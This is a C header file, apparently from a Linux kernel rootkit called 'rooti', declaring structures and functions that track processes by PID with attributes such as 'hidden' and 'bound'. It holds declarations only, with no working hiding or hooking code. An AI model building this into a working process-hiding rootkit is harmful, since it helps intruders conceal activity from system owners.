#ifndef ROOTI_TRACKING_PROCESS_H
#define ROOTI_TRACKING_PROCESS_H

#include <linux/list.h>

enum rooti_proc_attr {
    ROOTI_PROC_HIDDEN,
    ROOTI_PROC_BOUND
};

struct rooti_tracked_proc {
    struct list_head head;
    pid_t pid;
    unsigned long attrs;
};

int rooti_track_proc(pid_t pid, struct rooti_tracked_proc **dest, struct list_head *list);
int rooti_track_proc_attr(pid_t pid, enum rooti_proc_attr attr, struct list_head *list);

void rooti_untrack_proc(struct rooti_tracked_proc *tracked_proc);
void rooti_untrack_proc_attr(pid_t pid, enum rooti_proc_attr attr, struct list_head *list);

struct rooti_tracked_proc *rooti_search_tracked_proc(pid_t pid, struct list_head *list);
void rooti_clear_proc_tracking(struct list_head *list);

#endif